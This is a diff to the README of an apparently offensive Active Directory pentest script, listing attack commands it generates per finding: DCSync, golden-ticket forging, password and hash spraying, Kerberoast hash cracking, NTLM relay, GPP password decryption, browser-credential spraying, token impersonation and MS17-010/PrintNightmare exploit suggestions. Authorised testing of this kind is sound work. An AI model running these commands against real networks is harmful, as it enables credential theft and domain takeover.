@@ -181,11 +181,18 @@ The script writes fully resolved commands as each phase finds something. Always 
 | Finding | Commands Generated |
 |---------|--------------------|
 | Always | `impacket-secretsdump` template |
-| Users collected | `nxc` password spray + hash spray against `all_users.txt` |
+| `Pwn3d!` / admin on DC | **Immediately** writes DCSync: `impacket-secretsdump -just-dc` + `nxc smb --ntds` |
+| Domain SID obtained | Golden ticket template: `impacket-ticketer -nthash <krbtgt> -domain-sid <sid>` + `impacket-psexec -k` |
+| Users collected | `nxc` password spray + hash spray against `all_users.txt` + `sprayr.sh -U all_users.txt` suggestion |
+| Privileged group members | Resolves member RIDs → usernames → `groups/privileged_members_resolved.txt` + targeted spray command |
 | AS-REP hashes | `hashcat -m 18200` + `crackr.sh` one-liner |
-| Kerberoast hashes | `hashcat -m 13100` + `crackr.sh` one-liner |
+| Kerberoast hashes | `hashcat -m 13100/19600/19700` (RC4 + AES variants) + `crackr.sh` one-liner |
 | SMB signing disabled | `responder` + `impacket-ntlmrelayx` with payload template |
-| Groups.xml in SYSVOL | `gpp-decrypt` + `impacket-GetGPPPassword` |
+| Groups.xml in SYSVOL | Extracts actual `cpassword` value from downloaded XML → `gpp-decrypt '<actual_value>'` (no placeholder) |
+| Browser creds dumped | Parses `browser_creds.txt` for cleartext passwords → `browser_passwords.txt` + `sprayr.sh -P` command |
+| BloodHound zip collected | `bloodhound-cli upload` command + 4 key post-import queries in `attack_commands.txt` |
+| Active privileged sessions (`PRIV_SESSIONS=YES`) | Token impersonation (Meterpreter `incognito`, `Invoke-TokenManipulation`) + targeted Kerberoast against those users |
+| Legacy OS detected (`OLD_OS=YES`) | Per-OS CVE exploit commands: Win7/2008/XP → MS17-010 (`impacket-eternalblue`), 2019/Win10 → PrintNightmare (`rpcdump` check), unknown → `searchsploit` |
 
 ---
 
@@ -207,15 +214,17 @@ The script writes fully resolved commands as each phase finds something. Always 
 # 1. adr.sh collects the zip automatically in phase 6
 ls $TOOLKIT_ROOT/ad/corp.local/bloodhound/*.zip
 
-# 2. Open BloodHound CE in browser
-# 3. File Ingest → upload zip
+# 2. attack_commands.txt has the import command already:
+#    bloodhound-cli upload --path <zip> --url http://localhost:8080 --username admin --password <pass>
+
+# 3. Or manually: Open BloodHound CE in browser → File Ingest → upload zip
 
 # 4. Mark your current user as Owned
-# 5. Run pre-built queries:
+# 5. Run pre-built queries (attack_commands.txt lists these):
 #    - Shortest Path to Domain Admins from Owned Principals
-#    - Find AS-REP Roastable Users
-#    - Find Kerberoastable Users with Most Privileges
-#    - Computers Where DA is Logged On
+#    - Find Kerberoastable Users with Path to DA
+#    - Users with DCSync Rights
+#    - ASREPRoastable Users
 ```
 
 ---
